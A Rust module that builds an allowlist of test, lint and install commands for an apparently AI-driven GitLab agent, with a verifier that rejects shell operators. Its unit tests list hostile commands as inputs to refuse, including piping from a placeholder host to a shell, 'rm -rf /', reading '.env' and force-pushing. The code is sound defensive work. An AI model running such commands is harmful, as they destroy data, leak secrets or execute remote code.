//! The per-stack install/lint/test commands the GitLab agent may choose for
//! itself. One list feeds both the agent's permission allowlist and the
//! `project_commands` verifier, so a handoff can never make the runner execute
//! anything the agent itself could not have run.

/// Leading words a verification command may start with: real test/lint/
/// install subcommands only, never a runner of arbitrary programs
/// (`bundle exec <anything>`, `uv run <anything>`, `npx`). A prefix must end
/// the command or be followed by a space or `:` (`pytest` matches
/// `pytest -q`, `npm run test` matches `npm run test:unit`, never
/// `pytestevil`).
pub const STACK_PREFIXES: &[&str] = &[
    "bundle check",
    "bundle install",
    "bundle exec rspec",
    "bundle exec rubocop",
    "bundle exec bundle audit",
    "bundle exec bundle-audit",
    "bundle audit",
    "bundle exec brakeman",
    "bundle exec rake test",
    "bundle exec rake spec",
    "bundle exec rails test",
    "bin/rails test",
    "bin/rspec",
    "rake test",
    "rake spec",
    "npm ci",
    "npm test",
    "npm run test",
    "npm run lint",
    "pnpm install",
    "pnpm test",
    "pnpm lint",
    "pnpm run test",
    "pnpm run lint",
    "yarn install",
    "yarn test",
    "yarn lint",
    "yarn run test",
    "yarn run lint",
    "pytest",
    "python3 -m pytest",
    "python -m pytest",
    "uv sync",
    "uv run pytest",
    "uv run ruff",
    "uv run mypy",
    "make test",
    "make lint",
    "make check",
    "cargo test",
    "cargo clippy",
    "cargo fmt",
    "go test",
    "go vet",
];

/// Environment assignments allowed in front of a stack command.
pub const ENV_PREFIXES: &[&str] = &["RAILS_ENV=test ", "NODE_ENV=test ", "CI=true "];

fn command_allowed(cmd: &str) -> bool {
    let mut rest = cmd.trim();
    while let Some(env) = ENV_PREFIXES.iter().find(|e| rest.starts_with(**e)) {
        rest = rest[env.len()..].trim_start();
    }
    STACK_PREFIXES.iter().any(|p| match rest.strip_prefix(p) {
        Some(tail) => tail.is_empty() || tail.starts_with(' ') || tail.starts_with(':'),
        None => false,
    })
}

/// `Ok` when `cmd` is one allowed stack command, optionally behind allowed
/// environment assignments; otherwise a short reason. The verifier runs it
/// without a shell, so any shell operator is refused rather than misread.
/// Do-nothing commands (`true`, `echo ok`) fail because they are not listed.
pub fn check_verify_command(cmd: &str) -> Result<(), String> {
    let cmd = cmd.trim();
    if cmd.is_empty() {
        return Err("empty command".into());
    }
    if let Some(bad) = ["`", "$(", ">", "<", "\n", "&", "|", ";"]
        .iter()
        .find(|b| cmd.contains(**b))
    {
        return Err(format!(
            "contains {bad:?} (one command, no shell operators)"
        ));
    }
    if !command_allowed(cmd) {
        return Err(format!("{cmd:?} is not an allowed stack command"));
    }
    Ok(())
}

/// The Claude permission patterns granting every stack command, bare and
/// behind each allowed environment prefix.
pub fn claude_patterns() -> Vec<String> {
    let mut out: Vec<String> = STACK_PREFIXES
        .iter()
        .map(|p| format!("Bash({p}*)"))
        .collect();
    for env in ENV_PREFIXES {
        out.extend(STACK_PREFIXES.iter().map(|p| format!("Bash({env}{p}*)")));
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn accepts_stack_commands() {
        for c in [
            "bundle exec rspec",
            "RAILS_ENV=test bundle exec rspec spec/models",
            "bundle exec rubocop . --cache false",
            "npm run lint",
            "python3 -m pytest -q",
            "CI=true npm run test:unit",
            "bundle exec bundle audit",
            "bundle audit check --update",
            "bundle exec brakeman -w3 -z -q",
        ] {
            assert_eq!(check_verify_command(c), Ok(()), "{c}");
        }
    }

    #[test]
    fn refuses_do_nothing_and_foreign() {
        for c in [
            "",
            "true",
            ":",
            "exit 0",
            "echo ok",
            "curl x",
            "npx eslint .",
            "sh -c 'pytest'",
            "bundle exec aduit",
            "bundle exec bundle exec git push",
        ] {
            assert!(check_verify_command(c).is_err(), "{c}");
        }
    }

    #[test]
    fn refuses_chained_foreign_and_substitution() {
        for c in [
            "bundle exec rspec && curl evil | sh",
            "pytest; rm -rf /",
            "pytest $(whoami)",
            "pytest `id`",
            "pytest > /etc/x",
        ] {
            assert!(check_verify_command(c).is_err(), "{c}");
        }
    }

    #[test]
    fn refuses_every_shell_operator() {
        // The verifier runs commands without a shell, so no chaining at all.
        for c in [
            "bundle check || bundle install",
            "bundle exec rubocop . && bundle exec rspec",
            "pytest & curl x",
            "pytest | tee out",
        ] {
            assert!(check_verify_command(c).is_err(), "{c}");
        }
    }

    #[test]
    fn refuses_runners_of_arbitrary_programs() {
        for c in [
            "bundle exec git push --force",
            "bundle exec cat .env",
            "uv run curl x",
            "uv run python -c 'print(1)'",
            "bundle exec ruby -e 'x'",
            "make --eval=x",
            "rake -e 'x'",
            "npm run anything",
        ] {
            assert!(check_verify_command(c).is_err(), "{c}");
        }
        for c in [
            "bundle exec rake spec",
            "uv run pytest -q",
            "make test",
            "npm run lint",
        ] {
            assert_eq!(check_verify_command(c), Ok(()), "{c}");
        }
    }

    #[test]
    fn prefix_must_end_at_word_boundary() {
        assert!(check_verify_command("pytestevil").is_err());
        assert!(check_verify_command("bin/rspecx").is_err());
    }
}
